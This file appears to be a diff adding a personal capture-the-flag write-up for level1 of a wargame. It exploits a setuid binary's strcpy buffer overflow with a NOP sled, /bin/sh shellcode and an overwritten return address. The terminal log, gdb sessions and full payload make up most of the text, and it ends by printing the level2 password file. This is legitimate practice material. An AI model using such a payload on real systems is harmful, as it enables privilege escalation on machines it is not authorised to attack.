@@ -1,0 +1,148 @@
+$ ssh -p 22222 level1@ringzer0team.com
+level1@ringzer0team.com's password: 
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+Last login: Tue Jan 10 07:37:11 2017 from 36.84.10.106
+level1@rzt-bin01:~$ ls
+readme
+level1@rzt-bin01:~$ cd /levels
+level1@rzt-bin01:/levels$ ls
+level1  level1.c  level2  level2.c  level3  level3.c  level4  level4.c
+level1@rzt-bin01:/levels$ ls -al
+total 60
+dr-xr-xr-x  2 root   root   4096 Apr 21  2014 .
+drwxr-xr-x 24 root   root   4096 Nov 13 11:35 ..
+-r-sr-x---  1 level2 level1 5924 Feb 27  2014 level1
+-r--------  1 level1 level1  158 Aug 30 14:32 level1.c
+-r-sr-x---  1 level3 level2 9136 Feb 27  2014 level2
+-r--r-----  1 level2 level2 1058 May 27  2016 level2.c
+-r-sr-x---  1 level4 level3 6686 Mar  9  2014 level3
+-r--------  1 level3 level3  566 Mar  9  2014 level3.c
+-r-sr-x---  1 level5 level4 7309 Apr 21  2014 level4
+-r--------  1 level4 level4  925 Mar 18  2014 level4.c
+
+level1@rzt-bin01:/levels$ objdump -d -M intel level1
+
+level1:     file format elf32-i386
+
+
+Disassembly of section .init:
+
+080482bc <_init>:
+ 80482bc:   55                      push   ebp
+ 80482bd:   89 e5                   mov    ebp,esp
+
+[SNIP]
+
+
+0804841c <main>:
+ 804841c:   55                      push   ebp
+ 804841d:   89 e5                   mov    ebp,esp
+ 804841f:   83 e4 f0                and    esp,0xfffffff0
+ 8048422:   81 ec 10 04 00 00       sub    esp,0x410             <----- 1040 bytes of buffer, place noop, shellcode, and return EIP here
+ 8048428:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
+ 804842b:   83 c0 04                add    eax,0x4
+ 804842e:   8b 00                   mov    eax,DWORD PTR [eax]
+ 8048430:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 8048434:   8d 44 24 10             lea    eax,[esp+0x10]
+ 8048438:   89 04 24                mov    DWORD PTR [esp],eax
+ 804843b:   e8 c0 fe ff ff          call   8048300 <strcpy@plt>
+ 8048440:   b8 00 00 00 00          mov    eax,0x0
+ 8048445:   c9                      leave  
+ 8048446:   c3                      ret    
+ 8048447:   90                      nop
+ 8048448:   90                      nop
+ 8048449:   90                      nop
+ 804844a:   90                      nop
+ 804844b:   90                      nop
+ 804844c:   90                      nop
+ 804844d:   90                      nop
+ 804844e:   90                      nop
+ 804844f:   90                      nop
+
+[SNIP REST]
+
+
+Verify:
+(gdb) r $(python -c 'print "A" * 1036 + "B" * 4')
+Starting program: /levels/level1 $(python -c 'print "A" * 1036 + "B" * 4')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+
+found shellcode online (https://dhavalkapil.com/blogs/Shellcode-Injection/): \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80  (25 bytes)
+
+New command in gdb:
+(gdb) r $(python -c 'print "\x90" * 1011 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "BBBB"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /levels/level1 $(python -c 'print "\x90" * 1011 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "BBBB"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+
+Check esp for determination of return address:
+(gdb) x/400x $esp
+0xbffff380: 0x00000000  0xbffff424  0xbffff430  0xb7fe0858
+0xbffff390: 0xb7ff67f1  0xffffffff  0xb7ffeff4  0x08048254
+0xbffff3a0: 0x00000001  0xbffff3e0  0xb7fefbe6  0xb7fffac0
+0xbffff3b0: 0xb7fe0b48  0xb7fd5ff4  0x00000000  0x00000000
+0xbffff3c0: 0xbffff3f8  0x1e5704fb  0x326bb2eb  0x00000000
+0xbffff3d0: 0x00000000  0x00000000  0x00000002  0x08048330
+0xbffff3e0: 0x00000000  0xb7ff5990  0xb7e9ed3b  0xb7ffeff4
+[SNIP]
+0xbffff8f0: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff900: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff910: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff920: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff930: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff940: 0x90909090  0x90909090  0x50c03190  0x732f2f68
+0xbffff950: 0x622f6868  0xe3896e69  0x53e28950  0x0bb0e189
+0xbffff960: 0x424280cd  0x53004242  0x4c4c4548  0x69622f3d
+0xbffff970: 0x61622f6e  0x54006873  0x3d4d5245  0x72657478
+0xbffff980: 0x35322d6d  0x6c6f6336  0x5300726f  0x435f4853
+0xbffff990: 0x4e45494c  0x32313d54  0x37312e39  0x39312e36
+0xbffff9a0: 0x33322e37  0x31323220  0x32203131  0x53530032
+0xbffff9b0: 0x54545f48  0x642f3d59  0x702f7665  0x312f7374
+
+Let's use address 0xbffff910 for our return:
+
+
+level1@rzt-bin01:/levels$ ./level1 $(python -c 'print "\x90" * 1011 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x10\xf9\xff\xbf"')
+$ whoami
+level2
+$ cd /home/level2
+$ ls -al
+total 28
+dr-xr-x---  2 level2 level2 4096 Feb 26  2014 .
+drwxr-xr-x 17 root   root   4096 Oct 22  2014 ..
+-rw-r-----  1 level2 level2  220 Dec 31  2012 .bash_logout
+-rw-r-----  1 level2 level2 3415 Feb 25  2014 .bashrc
+-r--------  1 level2 level2   21 Feb 26  2014 .pass
+-rw-r-----  1 level2 level2  675 Dec 31  2012 .profile
+-rw-r-----  1 level2 level2   19 Feb 26  2014 .vimrc
+$ cat .pass
+TJyK9lJwZrgqc8nIIF6o
+
+
+format: No-op......Shellcode....EIP override
+
+No-op sled: 1011 bytes
+Shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 (25 bytes)
+EIP override: 4 bytes
+
+
